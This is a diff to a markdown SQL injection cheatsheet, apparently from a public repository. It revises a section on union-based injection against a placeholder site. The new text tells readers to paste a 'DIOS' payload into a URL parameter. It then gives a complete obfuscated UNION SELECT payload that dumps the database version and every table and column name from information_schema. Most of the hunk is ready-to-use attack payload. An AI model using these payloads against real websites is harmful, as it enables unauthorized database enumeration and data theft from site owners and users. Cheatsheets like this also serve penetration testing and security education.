@@ -357,8 +357,18 @@ The website should loads normally, showing us the number of the vulnerable colum
 **Retrieving the database name:**  
 ```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,database(),7,8,9,10,11,12,13,14-- -```  
 
-**Using DIOS payload to dump tables + columns automatically**
-```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,database(),7,8,9,10,11,12,13,14-- -```  
+**Using DIOS payload to dump tables & columns automatically**
+
+Click [here](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/Error%20Based%20SQLi/README.md#dumping-with-dios) to get DIOS Payloads, which we will use in the following payload. Simply copy DIOS and replace it with **paste_DIOS_here 
+
+```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,paste_DIOS_here,7,8,9,10,11,12,13,14-- -```  
+
+Example:
+```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,concat/*!(0x3c68323e20496e6a656374657220414c49454e205348414e553c2f68323e,0x3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/,7,8,9,10,11,12,13,14-- -```  
+
+**Retrieving tables & columns manually**  
+
+The process and the payloads for manual injecting is exactly the same. Please [click here](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/Error%20Based%20SQLi#dumping-with-the-traditional-method) to get more details.
 
 ## Retrieving the database  
 
